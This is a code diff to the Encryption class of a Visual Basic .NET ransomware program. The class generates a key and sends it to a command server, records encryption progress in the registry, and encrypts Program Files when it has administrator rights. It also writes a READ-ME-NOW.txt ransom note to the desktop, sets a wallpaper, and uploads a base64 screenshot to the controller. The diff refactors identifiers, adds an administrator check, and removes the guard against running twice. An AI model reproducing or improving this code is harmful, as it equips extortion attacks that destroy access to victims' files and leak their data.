@@ -94,17 +94,12 @@ Public Class Encryption
     Public Sub startAction()
         Try
 
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", Nothing)
-            If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Decryption in progress..." Then
-                Main.CloseMe()
-                Exit Sub
-            End If
 
             password = CreatePassword(15)
             Threading.Thread.CurrentThread.Sleep(1000)
-            Main.Send("Key" + SPL + ID.Bot + SPL + password)
+            Main.Send("Key" + SPL + Main.BOT + SPL + password)
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Encryption in progress...")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encryption in progress...")
 
             Dim T1 As New Threading.Thread(AddressOf Progfiles)
             Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
@@ -121,7 +116,7 @@ Public Class Encryption
             messageCreator()
             password = Nothing
 
-            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Rans-Status", "Encrypted")
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Encrypted")
 
             SC()
 
@@ -157,7 +152,7 @@ Public Class Encryption
 
     Public Sub Progfiles(ByVal password As String)
         On Error Resume Next
-        If ID.AmiAdmin = "Administrator" Then
+        If AmiAdmin() = "Administrator" Then
             encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", password)
         End If
         num += 1
@@ -170,7 +165,7 @@ Public Class Encryption
             Const WallpaperFile As String = "c:\wallpaper.bmp"
             Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
             Dim fullpath As String = path + "\READ-ME-NOW.txt"
-            Dim Message As String() = {Mynote, "Your ID is " & ID.Bot & ""}
+            Dim Message As String() = {Mynote, "Your ID is " & Main.BOT & ""}
             File.WriteAllLines(fullpath, Message)
 
 
@@ -205,7 +200,7 @@ Public Class Encryption
         screenshot.Save(TempFileName, Imaging.ImageFormat.Jpeg)
 
         Threading.Thread.CurrentThread.Sleep(1000)
-        Main.Send("SC" + SPL + ID.Bot + SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))
+        Main.Send("SC" + SPL + Main.BOT + SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))
 
     End Sub
 
@@ -225,6 +220,21 @@ Public Class Encryption
         End Try
 
     End Sub
+
+    Public Function AmiAdmin()
+        Try
+            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
+            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
+            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
+                Return "Administrator"
+            Else
+                Return "User"
+            End If
+        Catch ex As Exception
+            Return "Error"
+        End Try
+    End Function
+
 
 End Class
 
